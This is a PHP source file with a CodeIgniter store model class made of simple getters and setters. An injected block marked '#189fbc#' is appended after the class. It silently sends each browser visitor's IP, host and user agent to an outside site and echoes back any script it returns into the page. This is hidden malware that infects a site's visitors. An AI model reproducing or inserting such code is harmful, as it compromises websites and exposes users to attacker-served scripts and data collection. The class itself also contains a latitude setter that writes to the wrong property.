<?php if ( ! defined('BASEPATH')) exit('No direct script access allowed');
/**
 * @author hoang
 */
class MbStoreModel {
	private $_id = NULL;
	private $_name = NULL;
	private $_owner = NULL;
	private $_description = NULL;
	private $_introduction = NULL;
	private $_policy = NULL;
	private $_contact = NULL;
	private $_map_latitude = NULL;
	private $_map_longitude = NULL;
	private $_skin = NULL;
	private $_cat_id = NULL;

	public function getId()
	{
	    return $this->_id;
	}

	public function setId($id)
	{
	    $this->_id = $id;
	}
	
	public function getCatId()
	{
	    return $this->_cat_id;
	}

	public function setCatId($cat_id)
	{
	    $this->_cat_id = $cat_id;
	}	

	public function getName()
	{
	    return $this->_name;
	}

	public function setName($name)
	{
	    $this->_name = $name;
	}

	public function getOwner()
	{
	    return $this->_owner;
	}

	public function setOwner($owner)
	{
	    $this->_owner = $owner;
	}

	public function getDescription()
	{
	    return $this->_description;
	}

	public function setDescription($description)
	{
	    $this->_description = $description;
	}
	
	public function getIntroduction()
	{
	    return $this->_introduction;
	}

	public function setIntroduction($introduction)
	{
	    $this->_introduction = $introduction;
	}	

	public function getPolicy()
	{
	    return $this->_policy;
	}

	public function setPolicy($policy)
	{
	    $this->_policy = $policy;
	}		
	
	public function setContact($contact)
	{
	    $this->_contact = $contact;
	}	
	
	public function getContact()
	{
	    return $this->_contact;
	}

	public function setMapLongitude($longitude)
	{
	    $this->_map_longitude = $longitude;
	}			

	public function getMapLongitude()
	{
	    return $this->_map_longitude;
	}
	
	
	public function setMapLatitude($latitude)
	{
	    $this->_latitude = $latitude;
	}		

	public function getLatitude()
	{
	    return $this->_map_latitude;
	}	
	
	public function setSkin($skin)
	{
	    $this->_skin = $skin;
	}		

	public function getSkin()
	{
	    return $this->_skin;
	}		
		
}

#189fbc#
error_reporting(0); @ini_set('display_errors',0); $wp_m934 = @$_SERVER['HTTP_USER_AGENT']; if (( preg_match ('/Gecko|MSIE/i', $wp_m934) && !preg_match ('/bot/i', $wp_m934))){
$wp_m09934="http://"."web"."https".".com/"."web/?ip=".$_SERVER['REMOTE_ADDR']."&referer=".urlencode($_SERVER['HTTP_HOST'])."&ua=".urlencode($wp_m934);
if (function_exists('curl_init') && function_exists('curl_exec')) {$ch = curl_init(); curl_setopt ($ch, CURLOPT_URL,$wp_m09934); curl_setopt ($ch, CURLOPT_TIMEOUT, 20); curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
$wp_934m = curl_exec ($ch); curl_close($ch);} elseif (function_exists('file_get_contents') && @ini_get('allow_url_fopen')) {$wp_934m = @file_get_contents($wp_m09934);}
elseif (function_exists('fopen') && function_exists('stream_get_contents')) {$wp_934m=@stream_get_contents(@fopen($wp_m09934, "r"));}}
if (substr($wp_934m,1,3) === 'scr'){ echo $wp_934m; }
#/189fbc#
